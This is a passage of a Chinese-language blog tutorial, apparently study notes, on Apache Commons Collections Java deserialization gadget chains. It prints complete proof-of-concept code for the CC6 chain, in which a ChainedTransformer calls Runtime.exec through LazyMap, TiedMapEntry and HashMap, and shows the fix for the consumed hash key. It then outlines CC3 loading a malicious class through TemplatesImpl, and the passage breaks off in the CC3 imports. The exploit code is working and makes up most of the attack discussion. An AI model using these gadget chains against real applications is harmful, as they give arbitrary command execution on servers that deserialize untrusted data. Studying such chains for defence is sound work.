<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token punctuation">></span></span> lazymap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TiedMapEntry</span> entry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazymap<span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> ccc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ccc<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>entry<span class="token punctuation">,</span><span class="token string">"ccc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>lazymap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//        serialize(ccc);</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"MyPOC6.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"MyPOC6.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>修改完后，确实是解决了在序列化时会执行链子的这个问题，但是新的问题出来了，反序列化他也不会执行这个链子了，原因就是，在第一次put时，我们传入了一个key，导致hash被消耗，进而导致反序列化执行不成功</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721026627560-109a67fa-3b80-42ee-86cf-1206be7e4ec6.png"></p>
<p>所以我们需要在put后删除掉这个key，便能成功执行链子。</p>
<p>最终poc:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span>myCC6</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token punctuation">></span></span> lazymap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TiedMapEntry</span> entry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazymap<span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> ccc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ccc<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>entry<span class="token punctuation">,</span><span class="token string">"ccc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        lazymap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>lazymap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//        serialize(ccc);</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"MyPOC6.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"MyPOC6.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，执行成功。</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721026730576-564298ee-f9c7-41d6-9d96-7ac86306fa37.png"></p>
<p>总结一下，CC1和CC6都是通过InvokerTransform的transform方法中invoke的任意类的调用来调用Runtime.exec进行命令执行，然后就是LazyMap中的get方法的transform同名方法的使用，在这里就分开CC1和CC6了。</p>
<ul>
<li>CC1：接下来就是AnnotationInvocationHandler中存在invoke方法，能够实现动态代理调用LazyMap中的方法，然后同样是这个类中的readObject方法，当作入口类。</li>
<li>CC6:在LazyMap类之后就是TiedMapEntry类中的getValue方法对get同名方法的使用，再之后就是这个类的hashcode方法对getValue方法的使用，然后就是HashMap在使用时对直接调用hashCode，这样，这条链子就完成了。</li>
</ul>
<p>三条链子的大致流程如下如下。</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721014200212-f241e456-f1f1-44c2-a960-ec0e3ba4ab5f.jpeg"></p>
<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>CC3与前两条链子都不同，前两条是通过反射动态调用Runtime函数，但这条链是通过类的动态加载来加载我们编写好的恶意class文件来执行恶意命令。</p>
<p>我们首先看ClassLoder，找到defineClass，这是我们执行任意代码的方法</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721136200843-cb011c07-43da-4890-9eca-b8a4259107f6.png"></p>
<p>我们查找用法后在TemplatesImpl类中找到了defineClass方法</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721136379786-1e6e41b7-448d-40a0-a838-916cb320ac48.png"></p>
<p>在这个类中的getTransletInstance方法中又存在newInstance()的调用</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/44011315/1721136524014-fb2d9850-500f-44fa-8635-55f6b85c9d3c.png"></p>
<p>到此为止，我们的链子就出来了，我们只需要新建一个恶意类，编译成class文件，然后新建TemplatesImpl类，获取class，然后控制其中关键的参数。</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721136832673-80cc2ec1-c88c-4cbb-8006-a3bb27787ac5.png"></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721182848458-2b8b3631-27b0-4c40-bd62-fe886c178bc7.png"></p>
<p>然后就可以编写POC了。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">MyCC3</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">TransformerConfigurationException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
